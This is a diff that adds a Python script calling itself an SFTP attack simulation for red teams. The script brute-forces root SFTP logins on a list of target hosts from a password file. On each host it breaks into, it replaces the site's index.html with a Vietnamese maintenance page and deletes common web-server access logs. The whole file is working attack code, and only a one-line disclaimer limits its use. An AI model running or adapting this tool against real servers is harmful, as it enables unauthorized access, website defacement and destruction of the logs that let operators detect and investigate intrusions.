@@ -1,0 +1,198 @@
+#!/usr/bin/env python3
+"""
+Red Team Tool - SFTP Attack Simulation
+Author: Security Professional
+Description:
+    - Read targets from targets.txt
+    - Read passwords from passwords.txt
+    - Attempt SFTP login (default user: root)
+    - Replace /var/www/html/index.html with maintenance page
+    - Remove common access logs
+    - Log all actions for reporting
+USE ONLY IN AUTHORIZED PENETRATION TESTS.
+"""
+
+import paramiko
+import sys
+import os
+import logging
+import time
+from typing import List, Tuple, Optional
+
+# ========== CONFIGURATION ==========
+TARGETS_FILE = "targets.txt"
+PASSWORDS_FILE = "passwords.txt"
+SFTP_USERNAME = "root"          # Default username, change if needed
+SFTP_PORT = 22                   # Default SSH/SFTP port
+WWW_DIR = "/var/www/html/"
+INDEX_FILE = "index.html"
+HTML_CONTENT = """<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Bảo trì hệ thống</title>
+    <style>
+        body { text-align: center; padding: 150px; font-family: Arial, sans-serif; background-color: #f4f4f4; }
+        h1 { font-size: 50px; color: #333; }
+        p { font-size: 20px; color: #666; }
+    </style>
+</head>
+<body>
+    <h1>Hệ thống đang được bảo trì</h1>
+    <p>Chúng tôi sẽ trở lại sau ít phút. Cảm ơn bạn đã kiên nhẫn.</p>
+</body>
+</html>
+"""
+
+# Common web server access log paths
+LOG_PATHS = [
+    "/var/log/nginx/access.log",
+    "/var/log/nginx/access.log.1",
+    "/var/log/apache2/access.log",
+    "/var/log/apache2/access.log.1",
+    "/var/log/httpd/access_log",
+    "/var/log/httpd/access_log.1"
+]
+
+# ========== LOGGING SETUP ==========
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler("attack_simulation.log"),
+        logging.StreamHandler(sys.stdout)
+    ]
+)
+logger = logging.getLogger(__name__)
+
+
+def read_file_lines(filename: str) -> List[str]:
+    """Read lines from a file, strip whitespace, ignore empty lines."""
+    try:
+        with open(filename, 'r') as f:
+            lines = [line.strip() for line in f if line.strip()]
+        return lines
+    except FileNotFoundError:
+        logger.error(f"File not found: {filename}")
+        sys.exit(1)
+
+
+def try_sftp_login(host: str, username: str, password: str, port: int = 22) -> Optional[paramiko.SFTPClient]:
+    """
+    Attempt SFTP login.
+    Returns SFTP client if successful, None otherwise.
+    """
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Accept unknown host keys (testing only)
+    try:
+        client.connect(hostname=host, port=port, username=username, password=password, timeout=5)
+        sftp = client.open_sftp()
+        logger.info(f"[+] Success on {host}:{port} with {username}:{password}")
+        return sftp, client
+    except paramiko.AuthenticationException:
+        logger.debug(f"[-] Auth failed for {host} with {username}:{password}")
+        return None, None
+    except Exception as e:
+        logger.debug(f"[-] Connection error for {host}: {str(e)}")
+        return None, None
+
+
+def replace_index_html(sftp: paramiko.SFTPClient, remote_path: str) -> bool:
+    """
+    Replace index.html with maintenance page.
+    Creates a backup if possible.
+    """
+    try:
+        # Check if index.html exists
+        sftp.stat(remote_path)
+        # Backup original file
+        backup_path = remote_path + ".backup"
+        try:
+            sftp.rename(remote_path, backup_path)
+            logger.info(f"[+] Backup created: {backup_path}")
+        except Exception as e:
+            logger.warning(f"Could not backup original: {e}")
+        # Write new content
+        with sftp.open(remote_path, 'w') as f:
+            f.write(HTML_CONTENT)
+        logger.info(f"[+] Successfully replaced {remote_path}")
+        return True
+    except FileNotFoundError:
+        logger.warning(f"[-] {remote_path} not found on remote host")
+        return False
+    except Exception as e:
+        logger.error(f"[-] Failed to replace index.html: {e}")
+        return False
+
+
+def delete_logs(sftp: paramiko.SFTPClient, log_paths: List[str]) -> None:
+    """
+    Attempt to delete access log files.
+    """
+    for log_path in log_paths:
+        try:
+            sftp.stat(log_path)  # Check existence
+            sftp.remove(log_path)
+            logger.info(f"[+] Deleted log: {log_path}")
+        except FileNotFoundError:
+            logger.debug(f"Log not found: {log_path}")
+        except Exception as e:
+            logger.warning(f"Failed to delete {log_path}: {e}")
+
+
+def clean_up(sftp: paramiko.SFTPClient, ssh_client: paramiko.SSHClient) -> None:
+    """Close SFTP and SSH connections."""
+    if sftp:
+        sftp.close()
+    if ssh_client:
+        ssh_client.close()
+
+
+def attack_target(host: str, passwords: List[str], username: str, port: int) -> bool:
+    """
+    Attempt to compromise a single target.
+    Returns True if successful (at least one password worked and index.html replaced).
+    """
+    for pwd in passwords:
+        sftp, ssh = try_sftp_login(host, username, pwd, port)
+        if sftp:
+            # Authentication successful
+            index_path = os.path.join(WWW_DIR, INDEX_FILE)
+            success = replace_index_html(sftp, index_path)
+            if success:
+                delete_logs(sftp, LOG_PATHS)
+            clean_up(sftp, ssh)
+            return success
+    logger.warning(f"[-] No valid password for {host}")
+    return False
+
+
+def main():
+    logger.info("=== SFTP Attack Simulation Started ===")
+
+    # Read input files
+    targets = read_file_lines(TARGETS_FILE)
+    passwords = read_file_lines(PASSWORDS_FILE)
+
+    if not targets:
+        logger.error("No targets found in targets.txt")
+        sys.exit(1)
+    if not passwords:
+        logger.error("No passwords found in passwords.txt")
+        sys.exit(1)
+
+    logger.info(f"Loaded {len(targets)} target(s) and {len(passwords)} password(s)")
+
+    successful = 0
+    for target in targets:
+        logger.info(f"\n[*] Attacking {target}:{SFTP_PORT} as {SFTP_USERNAME}")
+        if attack_target(target, passwords, SFTP_USERNAME, SFTP_PORT):
+            successful += 1
+        time.sleep(1)  # Simple rate limiting to avoid flood
+
+    logger.info(f"\n=== Attack Simulation Finished ===")
+    logger.info(f"Successful compromises: {successful}/{len(targets)}")
+
+
+if __name__ == "__main__":
+    main()
